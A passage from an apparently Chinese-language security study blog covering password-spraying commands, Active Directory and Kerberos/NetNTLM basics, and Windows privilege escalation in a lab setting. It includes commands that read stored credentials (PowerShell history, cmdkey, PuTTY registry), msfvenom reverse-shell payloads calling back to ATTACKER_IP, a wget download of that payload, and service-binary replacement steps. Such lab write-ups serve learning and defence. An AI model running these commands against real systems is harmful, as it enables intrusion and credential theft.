plaintext"><table><tr><td class="code"><pre><span class="line">python o365Spray.py -u users.txt -p Winter2024 --validate</span><br></pre></td></tr></table></figure><p>📌 这个命令会：</p><ul><li>检测 O365 账户是否存在</li><li>进行密码喷洒</li></ul><hr><h5 id="🔹-LDAP-密码喷洒"><a href="#🔹-LDAP-密码喷洒" class="headerlink" title="🔹 LDAP 密码喷洒"></a><strong>🔹 LDAP 密码喷洒</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python ldapSpray.py -u users.txt -p Winter2024 -d example.com</span><br></pre></td></tr></table></figure><p>📌 适用于 <strong>Active Directory</strong> 认证的环境。</p><hr><h5 id="🔹-WinRM-密码喷洒"><a href="#🔹-WinRM-密码喷洒" class="headerlink" title="🔹 WinRM 密码喷洒"></a><strong>🔹 WinRM 密码喷洒</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python winrmSpray.py -u users.txt -p Winter2024 -d example.com</span><br></pre></td></tr></table></figure><p>📌 适用于 <strong>Windows 远程管理（WinRM）</strong> 认证测试。</p><hr><h5 id="🔹-MSSQL（Microsoft-SQL-Server）密码喷洒"><a href="#🔹-MSSQL（Microsoft-SQL-Server）密码喷洒" class="headerlink" title="🔹 MSSQL（Microsoft SQL Server）密码喷洒"></a><strong>🔹 MSSQL（Microsoft SQL Server）密码喷洒</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python mssqlSpray.py -u users.txt -p Winter2024 -d example.com</span><br></pre></td></tr></table></figure><p>📌 用于尝试暴力破解 <strong>SQL Server 账户</strong>。</p><h2 id="Phishing-网络钓鱼"><a href="#Phishing-网络钓鱼" class="headerlink" title="Phishing 网络钓鱼"></a>Phishing 网络钓鱼</h2><h2 id="Active-Directory-基础知识"><a href="#Active-Directory-基础知识" class="headerlink" title="Active Directory 基础知识"></a>Active Directory 基础知识</h2><h3 id="Windows-域"><a href="#Windows-域" class="headerlink" title="Windows 域"></a>Windows 域</h3><p>想象一下，您管理着一个只有五台计算机和五名员工的小型企业网络。在这样一个小型网络中，您可能能够毫无问题地单独配置每台计算机。您将手动登录每台计算机，为使用它们的任何人创建用户，并为每个员工的帐户进行特定配置。如果用户的计算机停止工作，您可能会去他们那里并现场修理计算机。</p><p>虽然这听起来是一种非常轻松的生活方式，但假设您的业务突然发展壮大，现在拥有 157 台计算机和 320 个不同的用户，分布在四个不同的办公室。您是否仍然能够将每台计算机作为单独的实体进行管理，为网络中的每个用户手动配置策略，并为每个人提供现场支持？答案很可能是否定的。</p><p>为了克服这些限制，我们可以使用 Windows 域。简而言之，<strong>Windows 域</strong>是受特定企业管理的一组用户和计算机。域背后的主要思想是将 Windows 计算机网络的通用组件的管理集中在一个名为<strong>Active Directory ( AD )<strong>的存储库中。运行 Active Directory 服务的服务器称为</strong>域控制器 ( DC )</strong>。</p><p><img src="/../imgs/$%7Bfiilename%7D/bebe5dfec0208bf563d01fa2dd1fb7a7-17435053133542.png" alt="Windows 域概述"></p><p>配置 Windows 域的主要优点是：</p><ul><li>**集中身份管理：**可以轻松从 Active Directory 配置整个网络中的所有用户。</li><li>**管理安全策略：**您可以直接从 Active Directory 配置安全策略，并根据需要将其应用于网络上的用户和计算机。</li></ul><p>真实案例</p><p>如果这听起来有点令人困惑，那么很可能您已经在学校、大学或工作中的某个时候与 Windows 域进行过交互。</p><p>在学校&#x2F;大学网络中，通常会为您提供一个用户名和密码，您可以在校园内的任何计算机上使用它们。您的凭据对所有计算机都有效，因为每当您在计算机上输入它们时，它都会将身份验证过程转发回 Active Directory，在那里将检查您的凭据。借助 Active Directory，您的凭据不需要存在于每台计算机上，并且可以在整个网络中使用。</p><p>Active Directory 也是允许您的学校&#x2F;大学限制您访问学校&#x2F;大学机器上的控制面板的组件。策略通常会部署在整个网络中，这样您就不具备这些计算机的管理权限。</p><h3 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h3><p>Windows 域的核心是 <strong>Active Directory 域服务（AD DS）</strong>。该服务充当目录，存储着网络中所有“对象”的信息。在 AD 支持的众多对象中，包含 <strong>用户、组、计算机、打印机、共享资源</strong> 等。让我们来看看其中的一些关键对象：</p><hr><h4 id="用户（Users）"><a href="#用户（Users）" class="headerlink" title="用户（Users）"></a><strong>用户（Users）</strong></h4><p>用户是 Active Directory 中最常见的对象类型之一。用户属于<strong>安全主体（Security Principals）</strong>，这意味着他们可以通过域进行身份验证，并可被授予访问文件、打印机等资源的权限。可以这样理解：安全主体是能够在网络资源上执行操作的对象。</p><p>用户对象可以用于表示两种实体：</p><ul><li><strong>人员（People）：</strong> 通常代表组织中的人员，如员工，他们需要访问网络资源。</li><li><strong>服务（Services）：</strong> 也可以定义用于特定服务（如 <strong>IIS</strong> 或 <strong>MSSQL</strong>）的用户。所有服务都需要用户账户来运行，但服务用户与普通用户不同，它们仅具有运行特定服务所需的权限。</li></ul><hr><h4 id="计算机（Machines）"><a href="#计算机（Machines）" class="headerlink" title="计算机（Machines）"></a><strong>计算机（Machines）</strong></h4><p>计算机是 Active Directory 中的另一类对象。每当一台计算机加入 Active Directory 域，都会创建一个对应的<strong>计算机对象（Machine Object）</strong>。计算机同样属于<strong>安全主体（Security Principals）</strong>，并被分配一个账户，与普通用户账户类似，不过其权限相对受限。</p><p><strong>计算机账户</strong> 本身在分配的计算机上具有本地管理员权限。通常情况下，计算机账户不应被直接访问，除非是该计算机本身使用。但与任何账户一样，如果掌握了计算机账户的密码，就可以利用它进行登录。</p><blockquote><p><strong>注意：</strong> 计算机账户的密码是<strong>自动轮换</strong>的，通常由 <strong>120 个随机字符</strong> 组成。</p></blockquote><p>识别计算机账户相对简单，它们遵循特定的命名规则：计算机账户的名称是计算机名后面加上 <strong><code>$</code></strong> 符号。例如，名为 <strong>DC01</strong> 的计算机，其计算机账户名称为 <strong>DC01$</strong>。</p><hr><h4 id="安全组（Security-Groups）"><a href="#安全组（Security-Groups）" class="headerlink" title="安全组（Security Groups）"></a><strong>安全组（Security Groups）</strong></h4><p>如果你熟悉 Windows，你可能知道可以创建<strong>用户组</strong>，以便为整个组分配文件或其他资源的访问权限，而不是单独为每个用户授予权限。这样可以更方便地管理权限：只需将用户添加到现有组，他们就会自动继承该组的所有权限。</p><p><strong>安全组</strong> 也属于<strong>安全主体（Security Principals）</strong>，因此，它们可以被授予网络资源的权限。</p><p><strong>组的成员</strong> 可以是<strong>用户</strong>，也可以是<strong>计算机</strong>，甚至可以包含其他<strong>组</strong>。</p><p>在域中，默认会创建多个组，用于授予特定权限。例如，以下是域中的一些重要安全组：</p><table><thead><tr><th><strong>安全组</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>Domain Admins</strong></td><td>该组的用户拥有整个域的管理权限，默认情况下，他们可以管理域内的任何计算机，包括域控制器（DCs）。</td></tr><tr><td><strong>Server Operators</strong></td><td>该组的用户可以管理 <strong>域控制器（DCs）</strong>，但不能更改任何管理员组的成员身份。</td></tr><tr><td><strong>Backup Operators</strong></td><td>该组的用户可以访问任何文件，无视权限限制。此组用于执行计算机数据的备份操作。</td></tr><tr><td><strong>Account Operators</strong></td><td>该组的用户可以在域中创建或修改其他账户。</td></tr><tr><td><strong>Domain Users</strong></td><td>包含域内所有用户账户。</td></tr><tr><td><strong>Domain Computers</strong></td><td>包含域内所有计算机账户。</td></tr><tr><td><strong>Domain Controllers</strong></td><td>包含域内所有 <strong>域控制器（DCs）</strong>。</td></tr></tbody></table><p>你可以在 <strong>Microsoft 官方文档</strong> 中获取完整的默认安全组列表。</p><hr><h4 id="Active-Directory-用户和计算机（ADUC）"><a href="#Active-Directory-用户和计算机（ADUC）" class="headerlink" title="Active Directory 用户和计算机（ADUC）"></a><strong>Active Directory 用户和计算机（ADUC）</strong></h4><p>要在 Active Directory 中配置 <strong>用户、组或计算机</strong>，需要登录到 <strong>域控制器（Domain Controller）</strong>，然后在 <strong>开始菜单</strong> 中运行：</p><p><strong>“Active Directory Users and Computers”（ADUC）</strong></p><h4 id="安全组与-OU"><a href="#安全组与-OU" class="headerlink" title="安全组与 OU"></a>安全组与 OU</h4><p>OUs 是一种<strong>容器对象</strong>，用于对用户和计算机进行分类。</p><p>您可能想知道为什么我们同时拥有组和 OU。虽然两者都用于对用户和计算机进行分类，但它们的用途完全不同：</p><ul><li><strong>OU</strong>可以方便地 <strong>将策略应用于</strong>用户和计算机，其中包括根据用户在企业中的特定角色而适用于用户组的特定配置。请记住，用户一次只能成为一个OU的成员，因为尝试将两组不同的策略应用于单个用户是没有意义的。</li><li>另一方面，<strong>安全组用于****授予对资源的权限</strong>。例如，如果您想允许某些用户访问共享文件夹或网络打印机，则可以使用组。用户可以是多个组的一部分，这是授予对多个资源的访问权限所必需的。</li></ul><p>默认情况下，所有加入域的机器（DC 除外）都将放入名为“Computers”的容器中。如果我们检查DC，我们会看到一些设备已经在那里：</p><p>DC:</p><p>域控制器是 Active Directory 域中第三大最常见的设备。域控制器允许您管理 Active Directory 域。这些设备通常被视为网络中最敏感的设备，因为它们包含环境中所有用户帐户的哈希密码。</p><p>到目前为止，我们只是出于方便的目的将用户和计算机组织在 OU 中，但其背后的主要思想是能够为每个 OU 单独部署不同的策略。这样，我们就可以根据用户所在的部门向他们推送不同的配置和安全基准。</p><p>Windows 通过<strong>组策略对象 ( GPO )</strong> 管理此类策略。GPO 只是可应用于 OU 的设置集合。GPO 可以包含针对用户或计算机的策略，允许您为特定机器和身份设置基线。</p><p>要配置 GPO，您可以使用开始菜单中的<strong>组策略管理</strong>工具：</p><p><img src="/../imgs/$%7Bfiilename%7D/b19052c41e27fbbb2651038cede63e11.png" alt="Start menu GPM"></p><p>打开它时，您首先会看到完整的 OU 层次结构，如前所述。要配置组策略，首先在<strong>组策略对象</strong>下创建一个 GPO ，然后将其链接到要应用策略的 OU 。例如，您可以看到您的计算机中已经存在一些 GPO：</p><p><img src="/../imgs/$%7Bfiilename%7D/06d5e70fbfa648f73e4598e18c8e9527.png" alt="OU scope"></p><p>GPO 通过名为 <code>SYSVOL</code> 的网络共享分发到网络，该共享存储在 DC 中。域中的所有用户通常都应能够通过网络访问此共享，以定期同步其 GPO。SYSVOL 共享默认指向我们网络中每个 DC 上的 <code>C:\Windows\SYSVOL\sysvol\</code> 目录。</p><p><a href="https://tryhackme.com/room/winadbasics">https://tryhackme.com/room/winadbasics</a></p><h3 id="身份验证方法"><a href="#身份验证方法" class="headerlink" title="身份验证方法"></a>身份验证方法</h3><p>在 Windows 域环境中，所有凭据都存储在 <strong>域控制器（Domain Controllers，DC）</strong> 中。每当用户尝试使用域凭据认证某项服务时，该服务需要向 <strong>域控制器</strong> 发送请求，以验证凭据是否正确。在 Windows 域中，网络身份验证可以使用以下两种协议：</p><ul><li><strong>Kerberos</strong>：适用于所有较新的 Windows 版本，是现代 Windows 域的默认身份验证协议。</li><li><strong>NetNTLM</strong>：一种旧版身份验证协议，主要用于兼容性目的。</li></ul><p>尽管 <strong>NetNTLM</strong> 已被认为<strong>过时</strong>，但大多数网络仍然<strong>同时支持这两种协议</strong>。接下来，我们将深入了解这两种协议的工作原理。</p><hr><h4 id="Kerberos-身份验证"><a href="#Kerberos-身份验证" class="headerlink" title="Kerberos 身份验证"></a><strong>Kerberos 身份验证</strong></h4><p><strong>Kerberos</strong> 是 <strong>现代 Windows 版本</strong> 的默认身份验证协议。用户通过 <strong>Kerberos</strong> 登录服务时，将会被分配 <strong>票据（Tickets）</strong>。可以将<strong>票据</strong>理解为<strong>已成功身份验证的证明</strong>——拥有有效票据的用户可以向服务出示该票据，以表明其已通过身份验证，从而获得访问权限。</p><p>当使用 <strong>Kerberos</strong> 进行身份验证时，系统会执行以下流程：</p><ol><li><strong>用户发送身份验证请求</strong><ul><li>用户向 <strong>密钥分发中心（Key Distribution Center, KDC）</strong> 发送请求，其中包含<strong>用户名</strong>和<strong>时间戳</strong>，并使用<strong>由其密码派生的密钥进行加密</strong>。</li><li><strong>KDC</strong> 是 Kerberos 票据的管理服务，通常安装在**域控制器（DC）**上，负责创建和分发 Kerberos 票据。</li></ul></li><li><strong>KDC 生成并返回票据授予票据（TGT）</strong><ul><li><strong>KDC</strong> 生成 <strong>票据授予票据（Ticket Granting Ticket, TGT）</strong>，并返回给用户。</li><li><strong>TGT 的作用</strong>：允许用户<strong>请求访问特定服务的额外票据</strong>，从而避免用户每次访问服务时都必须重新输入凭据。</li></ul></li><li><strong>TGT 的加密与存储机制</strong><ul><li><strong>TGT 由 KDC 使用 krbtgt 账户的密码哈希加密</strong>，因此用户<strong>无法直接访问其内容</strong>。</li><li><strong>TGT 的重要性</strong>：TGT <strong>内部包含会话密钥（Session Key）</strong> 的副本，且 <strong>KDC 本身不会存储会话密钥</strong>，而是<strong>通过解密 TGT 来恢复</strong>会话密钥（如果需要）。</li></ul></li></ol><p><img src="/../imgs/$%7Bfiilename%7D/d36f5a024c20fb480cdae8cd09ddc09f.png" alt="Kerberos step 1"></p><ol><li><p>当用户希望连接到网络上的某项服务（如共享资源、网站或数据库）时，他们会使用 <strong>TGT（票据授予票据）</strong> 向 <strong>KDC（密钥分发中心）</strong> 请求 <strong>TGS（服务票据，Ticket Granting Service）</strong>。TGS 是一种 <strong>专门针对特定服务</strong> 的票据，仅允许访问该票据所指定的服务。</p><p>为了请求 <strong>TGS</strong>，用户会发送以下信息：</p><ul><li><strong>用户名和时间戳</strong>（使用 <strong>会话密钥（Session Key）</strong> 加密）。</li><li><strong>TGT（票据授予票据）</strong>。</li><li><strong>SPN（服务主体名称，Service Principal Name）</strong>，用于指定<strong>希望访问的服务及其服务器</strong>。</li></ul><p><strong>KDC 处理请求后，将返回</strong>：</p><ol><li><strong>TGS（服务票据）</strong>：允许用户访问指定服务的票据。</li><li><strong>服务会话密钥（Service Session Key）</strong>：用于与目标服务进行身份验证。</li></ol><p><strong>TGS 的加密机制</strong>：</p><ul><li><strong>TGS 由 KDC 使用“服务所有者”（Service Owner）的哈希密钥加密</strong>。</li><li><strong>服务所有者</strong> 指运行该服务的 <strong>用户或计算机账户</strong>。</li><li><strong>TGS 内部包含“服务会话密钥”的副本</strong>，目标服务可以通过解密 <strong>TGS</strong> 获取该密钥，以完成身份验证。</li></ul></li></ol><p><img src="/../imgs/$%7Bfiilename%7D/84504666e78373c613d3e05d176282dc.png" alt="Kerberos step 2"></p><p>然后，<strong>TGS（服务票据）</strong> 可以被发送到目标服务，以进行身份验证并建立连接。服务将使用其配置账户的 <strong>密码哈希</strong> 来解密 <strong>TGS</strong>，并验证 <strong>服务会话密钥（Service Session Key）</strong> 的有效性。</p><p><img src="/../imgs/$%7Bfiilename%7D/8fbf08d03459c1b792f3b6efa4d7f285.png" alt="Kerberos step 3"></p><h4 id="NetNTLM-身份验证"><a href="#NetNTLM-身份验证" class="headerlink" title="NetNTLM 身份验证"></a>NetNTLM 身份验证</h4><p>NetNTLM 采用质询-响应机制。整个过程如下：</p><p><img src="/../imgs/$%7Bfiilename%7D/2eab5cacbd0d3e9dc9afb86169b711ec.png" alt="NetNTLM authentication"></p><p>客户端向他们希望访问的服务器发送身份验证请求。<br> 服务器生成一个随机数，并将其作为挑战发送给客户端。<br> 客户端将其 <strong>NTLM 密码哈希</strong> 与该挑战（以及其他已知数据）结合，生成对挑战的响应，并将其发送回服务器进行验证。<br> 服务器将挑战和响应转发到 <strong>域控制器</strong> 进行验证。<br> 域控制器使用该挑战重新计算响应，并与客户端发送的原始响应进行比较。如果两者匹配，则客户端通过身份验证；否则，访问被拒绝。验证结果将返回给服务器。<br> 服务器将身份验证结果转发给客户端。</p><p>请注意，为了安全起见，用户的 <strong>密码（或哈希）</strong> 永远不会通过网络传输。</p><p><strong>注意</strong>：上述过程适用于使用 <strong>域账户</strong> 的情况。如果使用的是 <strong>本地账户</strong>，服务器可以自行验证对挑战的响应，而无需与域控制器交互，因为它在 <strong>SAM（安全账户管理器）</strong> 中本地存储了密码哈希。</p><h3 id="树、森林和信任关系"><a href="#树、森林和信任关系" class="headerlink" title="树、森林和信任关系"></a>树、森林和信任关系</h3><p>到目前为止，我们讨论了如何管理单一域、域控制器的角色以及它如何将计算机、服务器和用户加入域中。</p><h4 id="单一域"><a href="#单一域" class="headerlink" title="单一域"></a>单一域</h4><p>随着公司发展，网络也会逐渐扩展。对于一个公司来说，开始时使用单一域是足够的，但随着时间推移，一些额外的需求可能会推动你拥有多个域。</p><h4 id="树（Trees）"><a href="#树（Trees）" class="headerlink" title="树（Trees）"></a>树（Trees）</h4><p>例如，假设你的公司突然扩展到一个新国家。这个新国家有不同的法律和规定，要求你更新 GPO（组策略对象）以符合法规。此外，你现在有了两个国家的 IT 团队，每个 IT 团队需要管理与各自国家相关的资源，而不互相干扰。虽然你可以创建复杂的 OU（组织单位）结构并使用委托来实现这一点，但拥有一个庞大的 AD 结构可能很难管理，并且容易出错。</p><p>幸运的是，Active Directory 支持集成多个域，使你可以将网络划分为可以独立管理的单元。如果你有两个共享相同命名空间（例如 thm.local）的域，那么这些域可以合并成一个树结构。</p><p>假设我们的 thm.local 域被划分为两个子域，分别是英国（UK）和美国（US）分支，那么你可以构建一个树，根域是 thm.local，两个子域分别为 uk.thm.local 和 us.thm.local，每个子域都有自己的 AD、计算机和用户：</p><h4 id="树结构"><a href="#树结构" class="headerlink" title="树结构"></a>树结构</h4><p>这种分区结构使我们能更好地控制谁可以访问域中的哪些资源。来自英国的 IT 团队将拥有自己的 DC（域控制器），只管理英国的资源。例如，英国用户无法管理美国用户。通过这种方式，每个分支的域管理员将完全控制各自的 DC，但不能控制其他分支的 DC。每个域也可以独立配置策略。</p><p>在讨论树和森林时，需要引入一个新的安全组。<strong>企业管理员组（Enterprise Admins）</strong> 将授予用户对整个企业所有域的管理员权限。每个域仍然拥有自己的 <strong>域管理员（Domain Admins）</strong>，他们具有对各自单一域的管理员权限，而 <strong>企业管理员</strong> 则可以控制企业中的一切。</p><h3 id="森林（Forests）"><a href="#森林（Forests）" class="headerlink" title="森林（Forests）"></a>森林（Forests）</h3><p>你管理的域也可以配置在不同的命名空间中。假设公司继续发展，并最终收购了另一家公司 MHT Inc. 当两家公司合并时，你可能会有不同的域树，每个域树由各自的 IT 部门管理。多个具有不同命名空间的域树合并到同一个网络中，这被称为 <strong>森林</strong>。</p><h4 id="信任关系（Trust-Relationships）"><a href="#信任关系（Trust-Relationships）" class="headerlink" title="信任关系（Trust Relationships）"></a>信任关系（Trust Relationships）</h4><p>在树和森林中组织多个域后，你可以获得更好的管理和资源的隔离网络。但某些时候，位于 <strong>THM UK</strong> 的用户可能需要访问 <strong>MHT ASIA</strong> 服务器上的共享文件。为了实现这一点，树和森林中的域之间通过信任关系相互连接。</p><p>简单来说，域之间的信任关系使得 <strong>THM UK</strong> 域的用户能够访问 <strong>MHT EU</strong> 域的资源。</p><p>最简单的信任关系是单向信任。在单向信任关系中，如果 <strong>域 AAA</strong> 信任 <strong>域 BBB</strong>，这意味着 <strong>域 BBB</strong> 中的用户可以被授权访问 <strong>域 AAA</strong> 中的资源：</p><h4 id="信任关系"><a href="#信任关系" class="headerlink" title="信任关系"></a>信任关系</h4><p>单向信任关系的方向与访问方向相反。</p><p>也可以建立双向信任关系，使得两个域都可以互相授权对方域的用户。默认情况下，将多个域加入同一个树或森林时，会形成双向信任关系。</p><p>需要注意的是，域之间建立信任关系并不会自动授予对其他域所有资源的访问权限。一旦建立了信任关系，你可以授权不同域的用户访问资源，但实际授权哪些资源是由你决定的。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>win提权</title>
      <link href="/2025/03/20/win%E6%8F%90%E6%9D%83/"/>
      <url>/2025/03/20/win%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="win的提权"><a href="#win的提权" class="headerlink" title="win的提权"></a>win的提权</h2><h3 id="从通常的位置收集密码"><a href="#从通常的位置收集密码" class="headerlink" title="从通常的位置收集密码"></a>从通常的位置收集密码</h3><h4 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h4><p>纯命令行</p><p>xfreerdp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:&lt;远程IP&gt; /u:&lt;用户名&gt; /p:&lt;密码&gt;</span><br></pre></td></tr></table></figure><p>界面</p><p>remmina</p><h4 id="Powershell历史"><a href="#Powershell历史" class="headerlink" title="Powershell历史"></a>Powershell历史</h4><p>每当用户使用 Powershell 运行命令时，它都会存储到一个文件中，该文件会保留过去命令的内存。这对于快速重复您之前使用的命令非常有用。如果用户在 Powershell 命令行中直接运行包含密码的命令，则稍后可以从 <code>cmd.exe</code>提示符中使用以下命令检索该密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br><span class="line">%userprofile%</span><br><span class="line">这是 Windows 的环境变量，表示当前用户的主目录（Home 目录）。</span><br><span class="line">如果要在powershell执行命令我们要把%userprofile%换为$Env：userprofile</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250310224125306.png" alt="image-20250310224125306"></p><h4 id="保存的-Windows-凭据"><a href="#保存的-Windows-凭据" class="headerlink" title="保存的 Windows 凭据"></a>保存的 Windows 凭据</h4><p>Windows 允许我们使用其他用户的凭据。此函数还提供了在系统上保存这些凭据的选项。以下命令将列出已保存的凭据：</p><p><code>cmdkey /list</code> 用于列出当前用户存储的凭据（如用户名和密码），这些凭据通常用于自动登录到远程计算机、网络共享或其他受身份验证保护的资源。</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250310224150121.png" alt="image-20250310224150121"></p><p>如果您发现任何值得尝试的凭据，可以将它们与 <code>runas</code> 命令和 <code>/savecred</code> 选项一起使用，如下所示。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">runas /savecred /user:admin cmd.exe</span><br></pre></td></tr></table></figure><p>该命令用于以 <code>admin</code> 用户的身份运行 <code>cmd.exe</code>（命令提示符），并使用 <code>savecred</code> 选项存储密码，以后运行相同的命令时无需再次输入密码。</p><p>这里发现哪个用户有凭证就使用哪个用户</p><p>以下是在文件上查找数据库连接字符串的快速方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</span><br></pre></td></tr></table></figure><p>该命令用于在 <code>web.config</code> 配置文件中查找包含 <code>connectionString</code> 的行，通常用于查找数据库连接字符串。</p><h4 id="PuTTY"><a href="#PuTTY" class="headerlink" title="PuTTY"></a>PuTTY</h4><p>是 Windows 系统上常见的 SSH 客户端。用户不必每次都指定连接的参数，而是可以存储会话，其中 IP、用户和其他配置可以存储以供以后使用。虽然 PuTTY 不允许用户存储他们的 SSH 密码，但它会存储包含明文身份验证凭据的代理配置</p><p>用于在注册表中查询 PuTTY 的会话配置，筛选出包含 “Proxy” 的项。这可以帮助您查看各个会话的代理设置。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</span><br></pre></td></tr></table></figure><h3 id="其他快速获胜"><a href="#其他快速获胜" class="headerlink" title="其他快速获胜"></a>其他快速获胜</h3><h4 id="Scheduled-Tasks-计划任务"><a href="#Scheduled-Tasks-计划任务" class="headerlink" title="Scheduled Tasks 计划任务"></a>Scheduled Tasks 计划任务</h4><p>可以使用 <code>schtasks</code> 命令从命令行列出计划任务，不带任何选项。要检索有关任何服务的详细信息，您可以使用类似于以下的命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /query /tn vulntask /fo list /v</span><br></pre></td></tr></table></figure><p>您将获得有关任务的大量信息，但对我们来说重要的是“Task to Run”参数，该参数指示计划任务执行的内容，以及“Run As User”参数，该参数显示将用于执行任务的用户。</p><p>如果我们的当前用户可以修改或覆盖 “Task to Run” 可执行文件，我们就可以控制 taskusr1 用户执行的内容，从而产生简单的权限提升。要检查可执行文件的文件权限，我们使用 <code>icacls</code>：</p><h4 id="AlwaysInstallElevated-始终安装提升"><a href="#AlwaysInstallElevated-始终安装提升" class="headerlink" title="AlwaysInstallElevated 始终安装提升"></a>AlwaysInstallElevated 始终安装提升</h4><p>Windows 安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。它们通常以启动它的用户的权限级别运行。但是，这些可以配置为从任何用户帐户（甚至是非特权帐户）以更高的权限运行。这可能允许我们生成一个恶意的 MSI 文件，该文件将以管理员权限运行。</p><p>此方法需要设置两个注册表值。您可以使用以下命令从命令行查询这些内容。</p><p>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer </p><p>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</p><p>为了能够利用此漏洞，应同时设置两者。否则，将无法进行利用。如果设置了这些，您可以使用 <code>msfvenom</code> 生成恶意 .msi 文件，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi</span><br></pre></td></tr></table></figure><p>由于这是一个反向 shell，因此您还应该运行相应配置的 Metasploit Handler 模块。传输已创建的文件后，您可以使用以下命令运行安装程序并接收反向 shell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</span><br></pre></td></tr></table></figure><p>该命令使用 <strong>Windows Installer (<code>msiexec</code>)</strong> 在 <strong>静默模式</strong> 下安装指定的 MSI 软件包 (<code>malicious.msi</code>)。</p><h3 id="Abusing-Service-Misconfigurations滥用服务配置错误"><a href="#Abusing-Service-Misconfigurations滥用服务配置错误" class="headerlink" title="Abusing Service Misconfigurations滥用服务配置错误"></a>Abusing Service Misconfigurations滥用服务配置错误</h3><h4 id="对服务可执行文件的不安全权限"><a href="#对服务可执行文件的不安全权限" class="headerlink" title="对服务可执行文件的不安全权限"></a>对服务可执行文件的不安全权限</h4><p>Windows 服务由<strong>服务控制管理器</strong> （SCM） 管理。SCM 是一个过程，负责根据需要管理服务的状态，检查任何给定服务的当前状态，并通常提供一种配置服务的方法。</p><p>Windows 计算机上的每个服务都有一个关联的可执行文件，每当服务启动时，该可执行文件将由 SCM 运行。请务必注意，服务可执行文件实现特殊功能以便能够与 SCM 通信，因此无法将任何可执行文件作为服务成功启动。每个服务还指定运行服务的用户帐户。</p><p>这个可以理解为我们可以对一个服务的执行文件有一个权限可以进行移动改名什么的然后我们将我们构造的恶意文件去替换服务关联的可执行文件</p><p>首先，我们将使用 <code>sc</code> 查询服务配置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc qc apphostsvc</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250313211322520.png" alt="image-20250313211322520"></p><p><strong>BINARY_PATH_NAME</strong> 参数指定关联的可执行文件</p><p>用于运行服务的帐户显示在 <strong>SERVICE_START_NAME</strong> 参数上</p><p>比如我们查询到</p><p>文件位置后使用 msfvenom 生成一个 exe-service 有效负载，并通过 python Web 服务器提供它</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe</span><br><span class="line"></span><br><span class="line">user@attackerpc$ python3 -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>然后在目标靶机上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe</span><br></pre></td></tr></table></figure><p>然后进行替换</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; cd C:\PROGRA~2\SYSTEM~1\</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move WService.exe WService.exe.bkp</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move C:\Users\thm-unpriv\rev-svc.exe WService.exe</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; icacls WService.exe /grant Everyone:F</span><br><span class="line">        Successfully processed 1 files.</span><br></pre></td></tr></table></figure><p>然后在我们攻击机上起一个监听即可</p><p>然后只要服务重启我们就可以</p><p>得到shell了</p><h4 id="未加引号的服务路径"><a href="#未加引号的服务路径" class="headerlink" title="未加引号的服务路径"></a>未加引号的服务路径</h4><p>使用 Windows 服务时，当服务配置为指向“未加引号的”可执行文件时，会发生非常特殊的行为</p><p>例如:</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250313211424055.png" alt="image-20250313211424055"></p><p>当 SCM 尝试执行关联的二进制文件时，会出现问题。由于 “Disk Sorter Enterprise” 文件夹的名称上有空格，因此命令变得不明确，并且 SCM 不知道您尝试执行以下哪项作</p><p>首先，搜索 <code>C：\\MyPrograms\\Disk.exe</code>。如果存在，则服务将运行此可执行文件。</p><p>如果后者不存在，它将搜索 <code>C:\\MyPrograms\\Disk Sorter.exe</code> 。如果存在，则服务将运行此可执行文件。</p><p>如果后者不存在，它将搜索 <code>C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe</code> 。此选项预期会成功，并且通常会在默认安装中运行。</p><p>所以我们可以创建一个恶意文件顶替关联文件利用机制让其执行我们的恶意文件比如我们创建一个C：\MyPrograms\Disk.exe</p><p>或者是C:\MyPrograms\Disk 